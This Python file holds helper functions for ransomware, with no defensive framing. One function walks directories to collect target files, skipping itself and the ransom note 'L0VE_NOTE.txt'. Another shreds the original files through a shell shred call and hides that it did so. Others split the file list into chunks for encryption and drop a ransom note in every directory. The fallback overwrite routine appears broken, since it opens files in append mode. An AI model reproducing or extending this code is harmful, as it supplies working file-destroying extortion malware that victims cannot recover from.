import os
import sys

from tqdm import tqdm  # Progress bar


def recursive_walk(paths, target_extensions, mode):
    """
    Walk through each path in the filesystem, return a list of valid files to infect
    or files to decrypt depending on mode param

    :param paths:             List of paths to walk recursively
    :param target_extensions: Array of targeted extensions
    :param mode:              Encryption mode (encrypt or decrypt)
    :return file_list:        Array of valid files to encrypt or decrypt
    """

    file_list = []
    for path in tqdm(paths, leave=True, smoothing=0.5, desc="Gathering files...."):
        for root, _, files in os.walk(path):  # root=path, _=subdirectories, files=files of any type
            for file in files:
                if file not in [sys.argv[0], "L0VE_NOTE.txt"]:  # Don't encrypt self or ransom note
                    abs_path = os.path.join(root, file)         # Get the files absolute path
                    ext = abs_path.split(".")[-1]               # Set ext to the file's extension
                    if mode == 1:
                        if ext in target_extensions:
                            file_list.append(os.path.join(root, file))
                    elif mode == 2:
                        if "AeS" in ext:  # Updated from file to ext, updated from .AeS to AeS
                            file_list.append(os.path.join(root, file))
    return file_list


def secure_delete(filename):
    """
    Securely delete file. Try running shred in a subprocess, if it doesnt exist
    perform a manual 3 pass overwrite using os

    :param filename:  absolute path of file to delete
    """

    if not os.path.exists(filename):  # Most secure delete ever
        return

    try:
        # -u deletes file after complete, -z zeroes the file at the end, hiding that it was shredded
        os.system("shred -uz {} >/dev/null 2>&1".format(filename))
    except (FileNotFoundError, OSError, BlockingIOError, Exception):
            with open(filename, "ab") as f:
                length = f.tell()      # Read each line of the file until the end
                for _ in range(0, 3):  # _ in python is short for a variable that isn't used
                    f.seek(0)          # Move back to the start of the file
                    f.write(os.urandom(length))  # Write garbage to file
            os.remove(filename)


def parse_array(array):
    """
    Determine how many times an array should be split

    :type array:    Array to parse
    :return chunks: Amount of chunks to pass to create_chunks as n
    """

    chunks = 0
    if len(array) > 100000:
        chunks += 10
    elif len(array) > 50000:
        chunks += 6
    else:
        chunks += 4
    return chunks


def create_chunks(array, n):
    """
    Split an array into n equal chunks with the remainder in it's own chunk

    :param n:     Amount of chunks to split the array into
    :param array: Array to split
    """

    try:
        n = len(array) / n
        for i in range(0, len(array), int(n)):
            yield array[i:i + int(n)]
    except ValueError:
        exit("Not enough files to split. Encryption process has been complete")


def leave_notes(note, paths):
    """
    Drop a note in each path

    :param note:   String to write to each directory after encryption is complete
    :param paths:  Array of paths to walk
    """

    try:
        for path in paths:
            with open(path + "/L0VE_NOTE.txt", "w") as f:
                f.write(note)
    except (IOError, FileExistsError):
        pass


